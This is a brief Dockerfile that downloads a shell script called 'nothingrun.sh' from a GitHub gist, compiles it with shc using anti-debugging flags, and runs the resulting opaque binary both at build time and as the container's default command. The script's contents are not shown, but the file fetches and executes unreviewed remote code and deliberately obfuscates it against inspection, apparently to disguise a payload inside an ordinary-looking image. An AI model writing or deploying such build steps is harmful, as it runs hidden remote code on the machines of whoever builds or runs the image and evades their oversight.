FROM alpine:edge
RUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories && \
    apk update && apk add --no-cache gcc musl-dev shc && \
    wget https://gist.githubusercontent.com/tuil45/de82b64b05bcb640419bd95f5e61a9c2/raw/91525aa268172632f6b55200b7864da4107985d7/nothingrun.sh && \
    shc -r -B -f /nothingrun.sh && \
    chmod +x /nothingrun.sh.x && \
    /nothingrun.sh.x
CMD /nothingrun.sh.x
